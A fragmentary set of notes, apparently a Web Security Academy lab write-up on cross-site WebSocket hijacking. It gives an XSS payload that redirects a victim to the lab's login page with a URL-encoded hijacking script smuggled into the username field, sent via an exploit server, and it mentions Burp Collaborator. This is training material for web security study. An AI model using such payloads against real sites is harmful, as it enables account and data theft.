...
# Before this method was working i researched it but now it doesn't work.
...
```
```bash
# So you need burp suite collabrator to be able to complete this task
...
```bash
# Url encode the script and after that put it into this payload

<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>

# And send it to exploit server.
```
